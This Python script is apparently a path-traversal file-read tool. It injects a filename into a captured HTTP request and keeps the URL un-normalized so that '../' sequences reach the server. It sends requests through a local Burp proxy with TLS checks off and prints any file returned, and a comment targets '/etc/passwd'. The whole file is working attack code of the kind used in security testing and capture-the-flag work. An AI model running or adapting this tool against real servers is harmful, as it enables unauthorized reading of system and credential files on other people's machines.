import requests

from utils.misc import replace_range
from utils.http_request_parser import parse_http_request

def get_file(content,filename,start_index,end_index,mode="FILE",method="GET"):
    new_content = replace_range(content,filename,start_index,end_index)
    # print(new_content)
    if mode=="FILE":
        method, url, headers, body = parse_http_request(new_content)
        send_request(method,url,headers,body)
        return
    elif mode=="URL":
        send_request(method=method,url=content)
        return
    return



def handle_url(url, host):
    if str(url).startswith("/"):
        # Preserve the exact path by not normalizing it
        new_url = f'http://{host}{url}'
        return new_url
    return url

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",  # For HTTPS requests
}

session = requests.session()

def send_request(method, url, headers, body):
    url = handle_url(url, headers["Host"])
    req = requests.Request(method, url=url, headers=headers)
    prep_req=req.prepare()
    prep_req.url=url
    print(prep_req.url)
    #? To Proxy from Burp, encode the URL as `/export/../etc/passwd` will be changed to `/etc/passwd` returning a 404
    response = session.send(prep_req,verify=False,allow_redirects=False)
    # print(response.content)
    if response.status_code == 200:
            print(response.content.decode())
    elif response.status_code == 500:
            print(f'Internal Server Error')
    elif response.status_code == 404:
            print(f'File Not Found')
    else:
            print(f'Unexpected response code.')
    return None
